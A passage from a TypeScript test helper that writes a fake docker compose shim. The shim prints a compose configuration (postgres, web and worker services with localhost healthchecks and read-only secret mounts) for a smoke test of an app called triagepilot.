  node - "$environment_file" "$3" "$5" <<'NODE'
const { readFileSync } = require("node:fs");
const { dirname } = require("node:path");
const env = Object.fromEntries(readFileSync(process.argv[2], "utf8").trim().split("\\n").map((line) => {
  const separator = line.indexOf("=");
  return [line.slice(0, separator), line.slice(separator + 1)];
}));
const project = process.argv[3];
const repositoryRoot = dirname(process.argv[4]);
const mount = (source, target) => ({ type: "bind", source, target, read_only: true });
process.stdout.write(JSON.stringify({
  name: project,
  networks: { default: { name: project + "_default", ipam: {} } },
  volumes: { "postgres-data": { name: project + "_postgres-data" } },
  services: {
  postgres: {
    image: "postgres:16",
    command: null,
    entrypoint: null,
    healthcheck: {
      test: ["CMD-SHELL", "pg_isready -U triagepilot -d triagepilot"],
      timeout: "5s",
      interval: "10s",
      retries: 5,
    },
    environment: {
      POSTGRES_USER: "triagepilot",
      POSTGRES_PASSWORD: "triagepilot",
      POSTGRES_DB: "triagepilot",
    },
    volumes: [{
      type: "volume",
      source: "postgres-data",
      target: "/var/lib/postgresql/data",
      read_only: false,
      volume: {},
    }],
    networks: { default: null },
  },
  web: {
    build: { context: repositoryRoot, dockerfile: "Dockerfile" },
    command: ["pnpm", "--filter", "@triagepilot/web", "start"],
    entrypoint: null,
    healthcheck: {
      test: [
        "CMD",
        "node",
        "-e",
        "fetch('http://localhost:8787/health').then(r=>process.exit(r.ok?0:1)).catch(()=>process.exit(1))",
      ],
      timeout: "5s",
      interval: "10s",
      retries: 5,
    },
    environment: {
      NODE_ENV: env.NODE_ENV,
      APP_BASE_URL: env.APP_BASE_URL,
      DATABASE_URL: env.DATABASE_URL,
      ADMIN_USERNAME: env.ADMIN_USERNAME,
      ADMIN_PASSWORD: env.ADMIN_PASSWORD,
      ADMIN_PASSWORD_FILE: env.ADMIN_PASSWORD_FILE,
      SESSION_SECRET: env.SESSION_SECRET,
      SESSION_SECRET_FILE: env.SESSION_SECRET_FILE,
      GITHUB_PRIVATE_KEY: env.GITHUB_PRIVATE_KEY,
      GITHUB_PRIVATE_KEY_FILE: env.GITHUB_PRIVATE_KEY_FILE,
      GITHUB_WEBHOOK_SECRET: env.GITHUB_WEBHOOK_SECRET,
      GITHUB_WEBHOOK_SECRET_FILE: env.GITHUB_WEBHOOK_SECRET_FILE,
      GITHUB_ORGANIZATION: env.GITHUB_ORGANIZATION,
      GITHUB_APP_ID: env.GITHUB_APP_ID,
    },
    volumes: [
      mount(env.SMOKE_PRIVATE_KEY_HOST_PATH, env.GITHUB_PRIVATE_KEY_FILE),
      mount(env.SMOKE_WEBHOOK_SECRET_HOST_PATH, env.GITHUB_WEBHOOK_SECRET_FILE),
      mount(env.SMOKE_ADMIN_PASSWORD_HOST_PATH, env.ADMIN_PASSWORD_FILE),
      mount(env.SMOKE_SESSION_SECRET_HOST_PATH, env.SESSION_SECRET_FILE),
    ],
    ports: [{
      target: 8787,
      published: "0",
      host_ip: "127.0.0.1",
      protocol: "tcp",
      mode: "ingress",
    }],
    networks: { default: null },
  },
  worker: {
    build: { context: repositoryRoot, dockerfile: "Dockerfile" },
    command: ["pnpm", "--filter", "@triagepilot/worker", "start"],
    entrypoint: null,
    environment: {
      NODE_ENV: env.NODE_ENV,
      DATABASE_URL: env.DATABASE_URL,
      GITHUB_ORGANIZATION: env.GITHUB_ORGANIZATION,
      GITHUB_APP_ID: env.GITHUB_APP_ID,
      GITHUB_PRIVATE_KEY: env.GITHUB_PRIVATE_KEY,
      GITHUB_PRIVATE_KEY_FILE: env.GITHUB_PRIVATE_KEY_FILE,
      WORKER_POLL_MS: env.WORKER_POLL_MS,
      WORKER_ID: env.WORKER_ID,
    },
    volumes: [mount(env.SMOKE_PRIVATE_KEY_HOST_PATH, env.GITHUB_PRIVATE_KEY_FILE)],
    networks: { default: null },
  },
} }));
NODE
elif [[ "$*" == *"port web 8787"* ]]; then
  printf '127.0.0.1:49153\\n'
fi
`,
  );

  return { root, temporaryParent, binDirectory, logFile };
}

function writeExecutable(path: string, source: string) {
  writeFileSync(path, source);
  chmodSync(path, 0o700);
}
